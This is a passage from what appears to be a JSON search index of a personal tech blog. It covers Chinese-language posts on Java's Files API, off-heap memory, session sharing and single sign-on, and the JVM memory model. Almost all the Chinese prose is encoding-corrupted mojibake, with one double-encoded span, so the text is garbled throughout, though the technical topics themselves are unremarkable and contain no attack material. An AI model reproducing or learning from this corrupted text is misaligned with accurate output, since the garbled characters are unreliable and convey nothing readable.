å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶: byte[] data = ... Files.write(Paths.get(&quot;/path/to/file.txt&quot;), data); // å†™å…¥æ–‡æœ¬å¹¶æŒ‡å®šç¼–ç : Files.writeString(Paths.get(&quot;/path/to/file.txt&quot;), &quot;æ–‡æœ¬å†…å®¹...&quot;, StandardCharsets.ISO_8859_1); // æŒ‰è¡Œå†™å…¥æ–‡æœ¬: List&lt;String&gt; lines = ... Files.write(Paths.get(&quot;/path/to/file.txt&quot;), lines); æ­¤å¤–ï¼ŒFileså·¥å…·ç±»è¿˜æœ‰copy()ã€delete()ã€exists()ã€move()ç­‰å¿«æ·æ–¹æ³•æ“ä½œæ–‡ä»¶å’Œç›®å½•ã€‚ æœ€åéœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼ŒFilesæä¾›çš„è¯»å†™æ–¹æ³•ï¼Œå—å†…å­˜é™åˆ¶ï¼Œåªèƒ½è¯»å†™å°æ–‡ä»¶ï¼Œä¾‹å¦‚é…ç½®æ–‡ä»¶ç­‰ï¼Œä¸å¯ä¸€æ¬¡è¯»å…¥å‡ ä¸ªGçš„å¤§æ–‡ä»¶ã€‚è¯»å†™å¤§å‹æ–‡ä»¶ä»ç„¶è¦ä½¿ç”¨æ–‡ä»¶æµï¼Œæ¯æ¬¡åªè¯»å†™ä¸€éƒ¨åˆ†æ–‡ä»¶å†…å®¹ã€‚ å°ç»“å¯¹äºç®€å•çš„å°æ–‡ä»¶è¯»å†™æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨Fileså·¥å…·ç±»ç®€åŒ–ä»£ç ã€‚","categories":[],"tags":[{"name":"io","slug":"io","permalink":"https://blog.kayleh.top/tags/io/"}]},{"title":"off-heap","slug":"å †å¤–å†…å­˜","date":"2020-12-20T05:21:38.000Z","updated":"2021-04-11T17:11:28.822Z","comments":true,"path":"å †å¤–å†…å­˜/","link":"","permalink":"https://blog.kayleh.top/%E5%A0%86%E5%A4%96%E5%86%85%E5%AD%98/","excerpt":"","text":"å †å¤–å†…å­˜off-heapå«åšå †å¤–å†…å­˜ï¼Œå°†ä½ çš„å¯¹è±¡ä»å †ä¸­è„±ç¦»å‡ºæ¥åºåˆ—åŒ–ï¼Œç„¶åå­˜å‚¨åœ¨ä¸€å¤§å—å†…å­˜ä¸­ï¼Œè¿™å°±åƒå®ƒå­˜å‚¨åˆ°ç£ç›˜ä¸Šä¸€æ ·ï¼Œä½†å®ƒä»ç„¶åœ¨RAMä¸­ã€‚å¯¹è±¡åœ¨è¿™ç§çŠ¶æ€ä¸‹ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œå®ƒä»¬å¿…é¡»é¦–å…ˆååºåˆ—åŒ–ï¼Œä¹Ÿä¸å—åƒåœ¾æ”¶é›†ã€‚åºåˆ—åŒ–å’Œååºåˆ—åŒ–å°†ä¼šå½±å“éƒ¨åˆ†æ€§èƒ½ï¼ˆæ‰€ä»¥å¯ä»¥è€ƒè™‘ä½¿ç”¨FST-serializationï¼‰ä½¿ç”¨å †å¤–å†…å­˜èƒ½å¤Ÿé™ä½GCå¯¼è‡´çš„æš‚åœã€‚å †å¤–å†…å­˜ä¸å—åƒåœ¾æ”¶é›†å™¨ç®¡ç†ï¼Œä¹Ÿä¸å±äºè€å¹´ä»£ï¼Œæ–°ç”Ÿä»£ã€‚","categories":[],"tags":[{"name":"jvm","slug":"jvm","permalink":"https://blog.kayleh.top/tags/jvm/"}]},{"title":"Single point login","slug":"å•ç‚¹ç™»å½•å®ç°","date":"2020-12-16T22:58:05.000Z","updated":"2021-04-11T17:11:28.783Z","comments":true,"path":"å•ç‚¹ç™»å½•å®ç°/","link":"","permalink":"https://blog.kayleh.top/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"å•ç‚¹ç™»å½•å®ç°åˆ†å¸ƒå¼Sessionå³Sessionå…±äº«å¦‚æœæˆ‘ä»¬æ˜¯åŒä¸€ä¸ªç½‘ç«™ï¼Œåœ¨å¤šå°æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œå¹¶ä¸”è®¿é—®åŒä¸€ä¸ªåŸŸåï¼Œè¿™ç§ç±»ä¼¼äºåˆ†å¸ƒå¼sessionï¼Œç›®å‰æ¯”è¾ƒç®€å•çš„è§£å†³æ–¹æ¡ˆç”¨nginxåšä»£ç†å°±å¯ä»¥å®ç°ã€‚ Ã¨Â¿Ã©Ã¥Ã¥Â¾Ã§Ã¦Ã¨Â¿Â° åœ¨å•æœåŠ¡å™¨webåº”ç”¨ä¸­ï¼Œç™»å½•ç”¨æˆ·ä¿¡æ¯åªéœ€å­˜åœ¨è¯¥æœåŠ¡çš„sessionä¸­ï¼Œè¿™æ˜¯æˆ‘ä»¬å‡ å¹´å‰æœ€é•¿è§çš„åŠæ³•ã€‚è€Œåœ¨å½“ä»Šåˆ†å¸ƒå¼ç³»ç»Ÿçš„æµè¡Œä¸­ï¼Œå¾®æœåŠ¡å·²æˆä¸ºä¸»æµï¼Œç”¨æˆ·ç™»å½•ç”±æŸä¸€ä¸ªå•ç‚¹æœåŠ¡å®Œæˆå¹¶å­˜å‚¨sessionåï¼Œåœ¨é«˜å¹¶å‘é‡çš„è¯·æ±‚ï¼ˆéœ€è¦éªŒè¯ç™»å½•ä¿¡æ¯ï¼‰åˆ°è¾¾æœåŠ¡ç«¯çš„æ—¶å€™é€šè¿‡è´Ÿè½½å‡è¡¡çš„æ–¹å¼åˆ†å‘åˆ°é›†ç¾¤ä¸­çš„æŸä¸ªæœåŠ¡å™¨ï¼Œè¿™æ ·å°±æœ‰å¯èƒ½å¯¼è‡´åŒä¸€ä¸ªç”¨æˆ·çš„å¤šæ¬¡è¯·æ±‚è¢«åˆ†å‘åˆ°é›†ç¾¤çš„ä¸åŒæœåŠ¡å™¨ä¸Šï¼Œå°±ä¼šå‡ºç°å–ä¸åˆ°sessionæ•°æ®çš„æƒ…å†µï¼Œäºæ˜¯sessionçš„å…±äº«å°±æˆäº†ä¸€ä¸ªé—®é¢˜ã€‚ç›®å‰å®ç°sessionå…±äº«çš„è§£å†³æ–¹æ¡ˆï¼š 1ï¼‰Sessionå¤åˆ¶ä¸å…±äº« å¤šä¸ªserverä¹‹é—´ç›¸äº’åŒæ­¥sessionï¼Œè¿™æ ·æ¯ä¸ªserverä¸Šéƒ½åŒ…å«å…¨éƒ¨Serviceçš„sessionã€‚ ä¼˜ç‚¹ï¼štomcatç­‰å¤šæ•°ä¸»æµwebæœåŠ¡å™¨éƒ½æ”¯æŒæ­¤åŠŸèƒ½ã€‚ ä¸è¶³ï¼šsessionåŒæ­¥éœ€è¦æ•°æ®ä¼ è¾“ï¼Œå å†…ç½‘å¸¦å®½ï¼Œæœ‰æ—¶å»¶ã€‚æ‰€æœ‰æœåŠ¡å™¨éƒ½åŒ…å«æ‰€æœ‰sessionæ•°æ®ï¼Œç‰¹åˆ«æ˜¯å½“sessionä¸­ä¿å­˜äº†è¾ƒå¤§çš„å¯¹è±¡ï¼Œè€Œä¸”å¯¹è±¡å˜åŒ–è¾ƒå¿«æ—¶ï¼Œæ€§èƒ½ä¸‹é™æ˜¾è‘—ï¼Œè¿™ç§ç‰¹æ€§ä½¿å¾—webåº”ç”¨çš„æ°´å¹³æ‰©å±•å—åˆ°äº†é™åˆ¶ã€‚ 2ï¼‰å®¢æˆ·ç«¯å­˜å‚¨æ³• æœåŠ¡ç«¯å­˜å‚¨æ‰€æœ‰ç”¨æˆ·çš„sessionï¼Œå†…å­˜å ç”¨è¾ƒå¤§ï¼Œä¹Ÿå¯ä»¥å°†sessionå­˜å‚¨åˆ°æµè§ˆå™¨cookieä¸­ï¼Œæ¯ä¸ªç«¯åªè¦å­˜å‚¨ä¸€ä¸ªç”¨æˆ·çš„æ•°æ®äº†ã€‚ ä¼˜ç‚¹ï¼šæœåŠ¡ç«¯ä¸éœ€è¦å­˜å‚¨ ç¼ºç‚¹ï¼šæ¯æ¬¡httpè¯·æ±‚éƒ½æºå¸¦sessionï¼Œå å¤–ç½‘å¸¦å®½æ•°æ®å­˜å‚¨åœ¨ç«¯ä¸Šï¼Œå¹¶åœ¨ç½‘ç»œä¼ è¾“ï¼Œå­˜åœ¨æ³„æ¼ã€ç¯¡æ”¹ã€çªƒå–ç­‰å®‰å…¨éšæ‚£ã€‚sessionå­˜å‚¨çš„æ•°æ®å¤§å°å—cookieé™åˆ¶ã€‚ 3ï¼‰åå‘ä»£ç†hashä¸€è‡´æ€§ ä¸ºäº†ä¿è¯é«˜å¯ç”¨ï¼Œæœ‰å¤šå°å†—ä½™ï¼Œåå‘ä»£ç†å±‚èƒ½ä¸èƒ½åšä¸€äº›äº‹æƒ…ï¼Œè®©åŒä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ä¿è¯è½åœ¨ä¸€å°webæœåŠ¡å™¨ä¸Šå‘¢ï¼Ÿå…·ä½“æ–¹æ¡ˆï¼šåå‘ä»£ç†ä½¿ç”¨IPæˆ–httpåè®®ä¸­çš„æŸäº›ä¸šåŠ¡å‚æ•°æ¥åšhashï¼Œä»¥ä¿è¯åŒä¸€ä¸ªæµè§ˆå™¨ç”¨æˆ·çš„è¯·æ±‚è½åœ¨åŒä¸€ä¸ªwebæœåŠ¡å™¨ä¸Šã€‚ ä¼˜ç‚¹ï¼šåªéœ€è¦æ”¹nginxé…ç½®ï¼Œä¸ç”¨æ”¹åº”ç”¨ä»£ç ï¼Œè´Ÿè½½å‡è¡¡ï¼Œåªè¦hashå±æ€§æ˜¯å‡åŒ€çš„ï¼Œå¤šå°webæœåŠ¡å™¨çš„è´Ÿè½½æ˜¯å‡è¡¡çš„ã€‚å¯ä»¥æ”¯æŒwebæœåŠ¡å™¨æ°´å¹³æ‰©å±•ï¼ˆsessionåŒæ­¥æ³•æ˜¯ä¸è¡Œçš„ï¼Œå—å†…å­˜é™åˆ¶ï¼‰ ç¼ºç‚¹ï¼šå¦‚æœwebæœåŠ¡å™¨é‡å¯ï¼Œä¸€éƒ¨åˆ†sessionä¼šä¸¢å¤±ï¼Œäº§ç”Ÿä¸šåŠ¡å½±å“ï¼Œä¾‹å¦‚éƒ¨åˆ†ç”¨æˆ·é‡æ–°ç™»å½•ã€‚å¦‚æœwebæœåŠ¡å™¨æ°´å¹³æ‰©å±•ï¼Œrehashåsessioné‡æ–°åˆ†å¸ƒï¼Œä¹Ÿä¼šæœ‰ä¸€éƒ¨åˆ†ç”¨æˆ·è·¯ç”±ä¸åˆ°æ­£ç¡®çš„sessionã€‚ 4ï¼‰æœåŠ¡ç«¯é›†ä¸­å­˜å‚¨ å°†sessionå­˜å‚¨åœ¨åç«¯çš„å­˜å‚¨å±‚ï¼Œå¦‚ï¼šæ•°æ®åº“æˆ–è€…ç¼“å­˜ã€‚å®¢æˆ·ç«¯æ¯å‘æ¬¡ä¸€æ¬¡è¯·æ±‚ï¼Œéƒ½ä¼šå…ˆä»å­˜å‚¨ä¸­è·å–ï¼Œå†å¤„ç†å…·ä½“çš„ä¸šåŠ¡é€»è¾‘ã€‚ ä¼˜ç‚¹ï¼šæ— å®‰å…¨éšæ‚£ï¼Œå¯ä»¥æ°´å¹³æ‰©ï¼ŒæœåŠ¡å™¨é‡å¯æˆ–è€…æ‰©å®¹éƒ½ä¸ä¼šé€ æˆsessionä¸¢å¤±ã€‚ ä¸è¶³ï¼šå¢åŠ äº†ä¸€æ¬¡ç½‘ç»œè°ƒç”¨ï¼Œè¦ä¿®æ”¹åº”ç”¨ä»£ç ã€‚ æ€»ç»“ï¼šä¸€èˆ¬å¯¹å•ç‚¹ç™»å½•å’Œsessionå…±äº«çš„å¤„ç†ï¼Œå¤§éƒ½é€‰æ‹©åœ¨æœåŠ¡ç«¯é›†ä¸­å­˜å‚¨æ¥å®ç°ã€‚å¯¹äºdbå­˜å‚¨è¿˜æ˜¯cacheï¼Œè‚¯å®šcacheæ˜¯é¦–é€‰ã€‚å› ä¸ºsessionè¯»å–çš„é¢‘ç‡ä¼šå¾ˆé«˜ï¼Œä½¿ç”¨æ•°æ®åº“å‹åŠ›ä¼šæ¯”è¾ƒå¤§ã€‚å¦‚æœæœ‰sessioné«˜å¯ç”¨éœ€æ±‚ï¼Œcacheå¯ä»¥åšé«˜å¯ç”¨ï¼Œä½†å¤§éƒ¨åˆ†æƒ…å†µä¸‹sessionå¯ä»¥ä¸¢å¤±ï¼Œä¸€èˆ¬ä¹Ÿä¸éœ€è¦è€ƒè™‘é«˜å¯ç”¨ã€‚ç›®å‰ä¸»æµçš„ç°å®æ–¹æ¡ˆæ˜¯ç”¨rediså®ç°sessionçš„å­˜å‚¨ã€‚ å•ç‚¹ç™»å½•å¦‚æœæ˜¯ä¸åŒç½‘ç«™ï¼Œæˆ‘ä»¬è¦åšåˆ°ç™»é™†Aç³»ç»Ÿï¼ŒåŒæ—¶ä»Aç³»ç»Ÿè·³è½¬åˆ°Bç³»ç»Ÿå¹¶ä¸”Bç³»ç»Ÿä¸ç”¨ç™»é™†ï¼ŒBç³»ç»Ÿç™»å½•åä¹Ÿå¯ä»¥è·³è½¬åˆ°Aç³»ç»Ÿå¹¶ä¸”Aç³»ç»Ÿä¹Ÿä¸éœ€è¦ç™»é™†ï¼Œç³»ç»Ÿå¯ä»¥æ‰©å±•åˆ°Nä¸ªï¼Œè¿™ç§æ˜¯å•ç‚¹ç™»å½•ï¼Œå¹¶ä¸”æ¶‰åŠåˆ°è·¨åŸŸçš„å¤„ç†ï¼Œè¿™ç§è§£å†³æ–¹æ¡ˆç›®å‰çœ‹æ¥æœ‰Oauth2.0ï¼ŒJWT ç­‰å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰æ¡†æ¶ï¼Œå¹¶ä¸”æœ€å¥½æ¯ä¸ªç³»ç»Ÿéƒ½é›†æˆå•ç‚¹ç™»å½•æ‰æ˜¯æ¯”è¾ƒå¥½çš„ï¼Œæˆ–è€…åšä¸€ä¸ªè®¤è¯ä¸­å¿ƒï¼Œå®ç°ç™»é™†è®¤è¯ä¸­å¿ƒåå¯ä»¥è·³è½¬åˆ°A,Bç³»ç»Ÿï¼Œè¿™æ—¶å€™A,Bç³»ç»Ÿå³å¯ä»¥åšå•ç‚¹ç™»å½•ä¹Ÿå¯ä»¥ä¸å†åšå•ç‚¹ç™»é™† img","categories":[],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"JMM memory model","slug":"Java-memory-modelå†…å­˜æ¨¡å‹","date":"2020-12-16T10:40:45.000Z","updated":"2021-04-11T17:11:28.231Z","comments":true,"path":"Java-memory-modelå†…å­˜æ¨¡å‹/","link":"","permalink":"https://blog.kayleh.top/Java-memory-model%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"æ‰€æœ‰çš„Javaå¼€å‘äººå‘˜å¯èƒ½ä¼šé‡åˆ°è¿™æ ·çš„å›°æƒ‘ï¼Ÿæˆ‘è¯¥ä¸ºå †å†…å­˜è®¾ç½®å¤šå¤§ç©ºé—´å‘¢ï¼ŸOutOfMemoryErrorçš„å¼‚å¸¸åˆ°åº•æ¶‰åŠåˆ°è¿è¡Œæ—¶æ•°æ®çš„å“ªå—åŒºåŸŸï¼Ÿè¯¥æ€ä¹ˆè§£å†³å‘¢ï¼Ÿå…¶å®å¦‚æœä½ ç»å¸¸è§£å†³æœåŠ¡å™¨æ€§èƒ½é—®é¢˜ï¼Œé‚£ä¹ˆè¿™äº›é—®é¢˜å°±ä¼šå˜çš„éå¸¸å¸¸è§ï¼Œäº†è§£JVMå†…å­˜ä¹Ÿæ˜¯ä¸ºäº†æœåŠ¡å™¨å‡ºç°æ€§èƒ½é—®é¢˜çš„æ—¶å€™å¯ä»¥å¿«é€Ÿçš„äº†è§£é‚£å—çš„å†…å­˜åŒºåŸŸå‡ºç°é—®é¢˜ï¼Œä»¥ä¾¿äºå¿«é€Ÿçš„è§£å†³ç”Ÿäº§æ•…éšœã€‚ å…ˆçœ‹ä¸€å¼ å›¾ï¼Œè¿™å¼ å›¾èƒ½å¾ˆæ¸…æ™°çš„è¯´æ˜JVMå†…å­˜ç»“æ„å¸ƒå±€ã€‚ Javaçš„å†…å­˜ç»“æ„**ï¼š** JUtH_20121024_RuntimeDataAreas_6_MemoryModel JVMå†…å­˜ç»“æ„ä¸»è¦æœ‰ä¸‰å¤§å—ï¼šå †å†…å­˜ã€æ–¹æ³•åŒºå’Œæ ˆã€‚å †å†…å­˜æ˜¯JVMä¸­æœ€å¤§çš„ä¸€å—ç”±å¹´è½»ä»£å’Œè€å¹´ä»£ç»„æˆï¼Œè€Œå¹´è½»ä»£å†…å­˜åˆè¢«åˆ†æˆä¸‰éƒ¨åˆ†ï¼ŒEdenç©ºé—´ã€From Survivorç©ºé—´ã€To Survivorç©ºé—´,é»˜è®¤æƒ…å†µä¸‹å¹´è½»ä»£æŒ‰ç…§8:1:1çš„æ¯”ä¾‹æ¥åˆ†é…ï¼› æ–¹æ³•åŒºå­˜å‚¨ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ç­‰æ•°æ®ï¼Œæ˜¯çº¿ç¨‹å…±äº«çš„åŒºåŸŸï¼Œä¸ºä¸Javaå †åŒºåˆ†ï¼Œæ–¹æ³•åŒºè¿˜æœ‰ä¸€ä¸ªåˆ«åNon-Heap(éå †)ï¼›æ ˆåˆåˆ†ä¸ºjavaè™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆä¸»è¦ç”¨äºæ–¹æ³•çš„æ‰§è¡Œã€‚ åœ¨é€šè¿‡ä¸€å¼ å›¾æ¥äº†è§£å¦‚ä½•é€šè¿‡å‚æ•°æ¥æ§åˆ¶å„åŒºåŸŸçš„å†…å­˜å¤§å° jvm_m_l æ§åˆ¶å‚æ•°-Xmsè®¾ç½®å †çš„æœ€å°ç©ºé—´å¤§å°ã€‚ -Xmxè®¾ç½®å †çš„æœ€å¤§ç©ºé—´å¤§å°ã€‚ -XX:NewSizeè®¾ç½®æ–°ç”Ÿä»£æœ€å°ç©ºé—´å¤§å°ã€‚ -XX:MaxNewSizeè®¾ç½®æ–°ç”Ÿä»£æœ€å¤§ç©ºé—´å¤§å°ã€‚ -XX:PermSizeè®¾ç½®æ°¸ä¹…ä»£æœ€å°ç©ºé—´å¤§å°ã€‚ -XX:MaxPermSizeè®¾ç½®æ°¸ä¹…ä»£æœ€å¤§ç©ºé—´å¤§å°ã€‚ -Xssè®¾ç½®æ¯ä¸ªçº¿ç¨‹çš„å †æ ˆå¤§å°ã€‚ æ²¡æœ‰ç›´æ¥è®¾ç½®è€å¹´ä»£çš„å‚æ•°ï¼Œä½†æ˜¯å¯ä»¥è®¾ç½®å †ç©ºé—´å¤§å°å’Œæ–°ç”Ÿä»£ç©ºé—´å¤§å°ä¸¤ä¸ªå‚æ•°æ¥é—´æ¥æ§åˆ¶ã€‚ è€å¹´ä»£ç©ºé—´å¤§å°=å †ç©ºé—´å¤§å°-å¹´è½»ä»£å¤§ç©ºé—´å¤§å° ä»æ›´é«˜çš„ä¸€ä¸ªç»´åº¦å†æ¬¡æ¥çœ‹JVMå’Œç³»ç»Ÿè°ƒç”¨ä¹‹é—´çš„å…³ç³» ** æ–¹æ³•åŒºå’Œå¯¹æ˜¯æ‰€æœ‰çº¿ç¨‹å…±äº«çš„å†…å­˜åŒºåŸŸï¼›è€Œjavaæ ˆã€æœ¬åœ°æ–¹æ³•æ ˆå’Œç¨‹åºå‘˜è®¡æ•°å™¨æ˜¯è¿è¡Œæ˜¯çº¿ç¨‹ç§æœ‰çš„å†…å­˜åŒºåŸŸã€‚ ä¸‹é¢æˆ‘ä»¬è¯¦ç»†ä»‹ç»æ¯ä¸ªåŒºåŸŸçš„ä½œç”¨ Javaå †ï¼ˆHeapï¼‰ å¯¹äºå¤§å¤šæ•°åº”ç”¨æ¥è¯´ï¼ŒJavaå †ï¼ˆJava Heapï¼‰æ˜¯Javaè™šæ‹Ÿæœºæ‰€ç®¡ç†çš„å†…å­˜ä¸­æœ€å¤§çš„ä¸€å—ã€‚Javaå †æ˜¯è¢«æ‰€æœ‰çº¿ç¨‹å…±äº«çš„ä¸€å—å†…å­˜åŒºåŸŸï¼Œåœ¨è™šæ‹Ÿæœºå¯åŠ¨æ—¶åˆ›å»ºã€‚æ­¤å†…å­˜åŒºåŸŸçš„å”¯ä¸€ç›®çš„å°±æ˜¯å­˜æ”¾å¯¹è±¡å®ä¾‹ï¼Œå‡ ä¹æ‰€æœ‰çš„å¯¹è±¡å®ä¾‹éƒ½åœ¨è¿™é‡Œåˆ†é…å†…å­˜ã€‚ Javaå †æ˜¯åƒåœ¾æ”¶é›†å™¨ç®¡ç†çš„ä¸»è¦åŒºåŸŸï¼Œå› æ­¤å¾ˆå¤šæ—¶å€™ä¹Ÿè¢«ç§°åšâ€œGCå †â€ã€‚å¦‚æœä»å†…å­˜å›æ”¶çš„è§’åº¦çœ‹ï¼Œç”±äºç°åœ¨æ”¶é›†å™¨åŸºæœ¬éƒ½æ˜¯é‡‡ç”¨çš„åˆ†ä»£æ”¶é›†ç®—æ³•ï¼Œæ‰€ä»¥Javaå †ä¸­è¿˜å¯ä»¥ç»†åˆ†ä¸ºï¼šæ–°ç”Ÿä»£å’Œè€å¹´ä»£ï¼›å†ç»†è‡´ä¸€ç‚¹çš„æœ‰Edenç©ºé—´ã€From Survivorç©ºé—´ã€To Survivorç©ºé—´ç­‰ã€‚ æ ¹æ®Javaè™šæ‹Ÿæœºè§„èŒƒçš„è§„å®šï¼ŒJavaå †å¯ä»¥å¤„äºç‰©ç†ä¸Šä¸è¿ç»­çš„å†…å­˜ç©ºé—´ä¸­ï¼Œåªè¦é€»è¾‘ä¸Šæ˜¯è¿ç»­çš„å³å¯ï¼Œå°±åƒæˆ‘ä»¬çš„ç£ç›˜ç©ºé—´ä¸€æ ·ã€‚åœ¨å®ç°æ—¶ï¼Œæ—¢å¯ä»¥å®ç°æˆå›ºå®šå¤§å°çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯æ‰©å±•çš„ï¼Œä¸è¿‡å½“å‰ä¸»æµçš„è™šæ‹Ÿæœºéƒ½æ˜¯æŒ‰ç…§å¯æ‰©å±•æ¥å®ç°çš„ï¼ˆé€šè¿‡-Xmxå’Œ-Xmsæ§åˆ¶ï¼‰ã€‚ å¦‚æœåœ¨å †ä¸­æ²¡æœ‰å†…å­˜å®Œæˆå®ä¾‹åˆ†é…ï¼Œå¹¶ä¸”å †ä¹Ÿæ— æ³•å†æ‰©å±•æ—¶ï¼Œå°†ä¼šæŠ›å‡ºOutOfMemoryErrorå¼‚å¸¸ã€‚ **æ–¹æ³•åŒºï¼ˆMethod Areaï¼‰** æ–¹æ³•åŒºï¼ˆMethod Areaï¼‰ä¸Javaå †ä¸€æ ·ï¼Œæ˜¯å„ä¸ªçº¿ç¨‹å…±äº«çš„å†…å­˜åŒºåŸŸï¼Œå®ƒç”¨äºå­˜å‚¨å·²è¢«è™šæ‹ŸæœºåŠ è½½çš„ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ã€å³æ—¶ç¼–è¯‘å™¨ç¼–è¯‘åçš„ä»£ç ç­‰æ•°æ®ã€‚è™½ç„¶Javaè™šæ‹Ÿæœºè§„èŒƒæŠŠæ–¹æ³•åŒºæè¿°ä¸ºå †çš„ä¸€ä¸ªé€»è¾‘éƒ¨åˆ†ï¼Œä½†æ˜¯å®ƒå´æœ‰ä¸€ä¸ªåˆ«åå«åšNon-Heapï¼ˆéå †ï¼‰ï¼Œç›®çš„åº”è¯¥æ˜¯ä¸Javaå †åŒºåˆ†å¼€æ¥ã€‚ å¯¹äºä¹ æƒ¯åœ¨HotSpotè™šæ‹Ÿæœºä¸Šå¼€å‘å’Œéƒ¨ç½²ç¨‹åºçš„å¼€å‘è€…æ¥è¯´ï¼Œå¾ˆå¤šäººæ„¿æ„æŠŠæ–¹æ³•åŒºç§°ä¸ºâ€œæ°¸ä¹…ä»£â€ï¼ˆPermanent Generationï¼‰ï¼Œæœ¬è´¨ä¸Šä¸¤è€…å¹¶ä¸ç­‰ä»·ï¼Œä»…ä»…æ˜¯å› ä¸ºHotSpotè™šæ‹Ÿæœºçš„è®¾è®¡å›¢é˜Ÿé€‰æ‹©æŠŠGCåˆ†ä»£æ”¶é›†æ‰©å±•è‡³æ–¹æ³•åŒºï¼Œæˆ–è€…è¯´ä½¿ç”¨æ°¸ä¹…ä»£æ¥å®ç°æ–¹æ³•åŒºè€Œå·²ã€‚ Javaè™šæ‹Ÿæœºè§„èŒƒå¯¹è¿™ä¸ªåŒºåŸŸçš„é™åˆ¶éå¸¸å®½æ¾ï¼Œé™¤äº†å’ŒJavaå †ä¸€æ ·ä¸éœ€è¦è¿ç»­çš„å†…å­˜å’Œå¯ä»¥é€‰æ‹©å›ºå®šå¤§å°æˆ–è€…å¯æ‰©å±•å¤–ï¼Œè¿˜å¯ä»¥é€‰æ‹©ä¸å®ç°åƒåœ¾æ”¶é›†ã€‚ç›¸å¯¹è€Œè¨€ï¼Œåƒåœ¾æ”¶é›†è¡Œä¸ºåœ¨è¿™ä¸ªåŒºåŸŸæ˜¯æ¯”è¾ƒå°‘å‡ºç°çš„ï¼Œä½†å¹¶éæ•°æ®è¿›å…¥äº†æ–¹æ³•åŒºå°±å¦‚æ°¸ä¹…ä»£çš„åå­—ä¸€æ ·â€œæ°¸ä¹…â€å­˜åœ¨äº†ã€‚è¿™ä¸ªåŒºåŸŸçš„å†…å­˜å›æ”¶ç›®æ ‡ä¸»è¦æ˜¯é’ˆå¯¹å¸¸é‡æ± çš„å›æ”¶å’Œå¯¹ç±»å‹çš„å¸è½½ï¼Œä¸€èˆ¬æ¥è¯´è¿™ä¸ªåŒºåŸŸçš„å›æ”¶â€œæˆç»©â€æ¯”è¾ƒéš¾ä»¥ä»¤äººæ»¡æ„ï¼Œå°¤å…¶æ˜¯ç±»å‹çš„å¸è½½ï¼Œæ¡ä»¶ç›¸å½“è‹›åˆ»ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†åŒºåŸŸçš„å›æ”¶ç¡®å®æ˜¯æœ‰å¿…è¦çš„ã€‚ æ ¹æ®Javaè™šæ‹Ÿæœºè§„èŒƒçš„è§„å®šï¼Œå½“æ–¹æ³•åŒºæ— æ³•æ»¡è¶³å†…å­˜åˆ†é…éœ€æ±‚æ—¶ï¼Œå°†æŠ›å‡ºOutOfMemoryErrorå¼‚å¸¸ã€‚ **ç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Counter Registerï¼‰**ç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Counter Registerï¼‰æ˜¯ä¸€å—è¾ƒå°çš„å†…å­˜ç©ºé—´ï¼Œå®ƒçš„ä½œç”¨å¯ä»¥çœ‹åšæ˜¯å½“å‰çº¿ç¨‹æ‰€æ‰§è¡Œçš„å­—èŠ‚ç çš„è¡Œå·æŒ‡ç¤ºå™¨ã€‚åœ¨è™šæ‹Ÿæœºçš„æ¦‚å¿µæ¨¡å‹é‡Œï¼ˆä»…æ˜¯æ¦‚å¿µæ¨¡å‹ï¼Œå„ç§è™šæ‹Ÿæœºå¯èƒ½ä¼šé€šè¿‡ä¸€äº›æ›´é«˜æ•ˆçš„æ–¹å¼å»å®ç°ï¼‰ï¼Œå­—èŠ‚ç è§£é‡Šå™¨å·¥ä½œæ—¶å°±æ˜¯é€šè¿‡æ”¹å˜è¿™ä¸ªè®¡æ•°å™¨çš„å€¼æ¥é€‰å–ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤ï¼Œåˆ†æ”¯ã€å¾ªç¯ã€è·³è½¬ã€å¼‚å¸¸å¤„ç†ã€çº¿ç¨‹æ¢å¤ç­‰åŸºç¡€åŠŸèƒ½éƒ½éœ€è¦ä¾èµ–è¿™ä¸ªè®¡æ•°å™¨æ¥å®Œæˆã€‚ç”±äºJavaè™šæ‹Ÿæœºçš„å¤šçº¿ç¨‹æ˜¯é€šè¿‡çº¿ç¨‹è½®æµåˆ‡æ¢å¹¶åˆ†é…å¤„ç†å™¨æ‰§è¡Œæ—¶é—´çš„æ–¹å¼æ¥å®ç°çš„ï¼Œåœ¨ä»»ä½•ä¸€ä¸ªç¡®å®šçš„æ—¶åˆ»ï¼Œä¸€ä¸ªå¤„ç†å™¨ï¼ˆå¯¹äºå¤šæ ¸å¤„ç†å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå†…æ ¸ï¼‰åªä¼šæ‰§è¡Œä¸€æ¡çº¿ç¨‹ä¸­çš„æŒ‡ä»¤ã€‚å› æ­¤ï¼Œä¸ºäº†çº¿ç¨‹åˆ‡æ¢åèƒ½æ¢å¤åˆ°æ­£ç¡®çš„æ‰§è¡Œä½ç½®ï¼Œæ¯æ¡çº¿ç¨‹éƒ½éœ€è¦æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ç¨‹åºè®¡æ•°å™¨ï¼Œå„æ¡çº¿ç¨‹ä¹‹é—´çš„è®¡æ•°å™¨äº’ä¸å½±å“ï¼Œç‹¬ç«‹å­˜å‚¨ï¼Œæˆ‘ä»¬ç§°è¿™ç±»å†…å­˜åŒºåŸŸä¸ºâ€œçº¿ç¨‹ç§æœ‰â€çš„å†…å­˜ã€‚ 